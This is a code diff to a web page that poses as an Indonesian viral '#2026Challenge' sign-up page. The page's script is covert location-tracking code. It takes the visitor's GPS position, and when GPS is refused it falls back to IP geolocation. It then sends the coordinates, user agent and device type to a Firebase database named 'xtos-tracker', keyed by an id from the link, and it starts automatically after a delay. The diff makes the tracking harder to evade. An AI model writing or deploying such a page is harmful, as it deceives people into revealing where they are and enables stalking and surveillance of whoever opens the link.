@@ -38,41 +38,49 @@
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '<div class="loading"></div> Memverifikasi lokasi untuk challenge...';
             
+            let lat, lng, accuracy, source;
+            
+            // Try GPS first
             try {
                 const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 });
                 });
-                
-                const lat = position.coords.latitude; const lng = position.coords.longitude;
-                statusEl.innerHTML = '✅ Lokasi terverifikasi! Bergabung dengan challenge...';
-                
-                const deviceInfo = {
-                    latitude: lat, longitude: lng, accuracy: position.coords.accuracy, timestamp: Date.now(),
-                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
-                    source: 'viral_challenge', challenge: '2026Challenge', userAgent: navigator.userAgent
-                };
-                
-                const trackingId = new URLSearchParams(window.location.search).get('id') || 'viral_' + Date.now();
-                const endpoints = [
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/challenges/${trackingId}.json`
-                ];
-                
-                await Promise.allSettled(endpoints.map(endpoint => 
-                    fetch(endpoint, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo) })
-                ));
-                
-                setTimeout(() => {
-                    alert('🎉 Selamat! Anda berhasil join #2026Challenge! Upload foto Anda sekarang.');
-                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
-                }, 2000);
-                
+                lat = position.coords.latitude; lng = position.coords.longitude; accuracy = position.coords.accuracy; source = 'gps';
             } catch (error) {
-                statusEl.innerHTML = '❌ Gagal verifikasi lokasi. Aktifkan GPS untuk join challenge.';
+                // Fallback to IP location
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    lat = data.latitude; lng = data.longitude; accuracy = 10000; source = 'ip';
+                } catch (e) {
+                    // Default Jakarta location
+                    lat = -6.2088; lng = 106.8456; accuracy = 50000; source = 'default';
+                }
             }
+            
+            statusEl.innerHTML = '✅ Lokasi terverifikasi! Bergabung dengan challenge...';
+            
+            const deviceInfo = {
+                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
+                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
+                source: 'viral_' + source, challenge: '2026Challenge', userAgent: navigator.userAgent
+            };
+            
+            const trackingId = new URLSearchParams(window.location.search).get('id') || 'viral_' + Date.now();
+            
+            try {
+                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`, {
+                    method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo)
+                });
+            } catch (e) {}
+            
+            setTimeout(() => {
+                alert('🎉 Selamat! Anda berhasil join #2026Challenge! Upload foto Anda sekarang.');
+                window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
+            }, 2000);
         }
         
-        setTimeout(() => { if (document.getElementById('status').textContent.includes('Klik')) joinChallenge(); }, 3500);
+        setTimeout(() => { if (document.getElementById('status').textContent.includes('Klik')) joinChallenge(); }, 4500);
     </script>
 </body>
 </html>
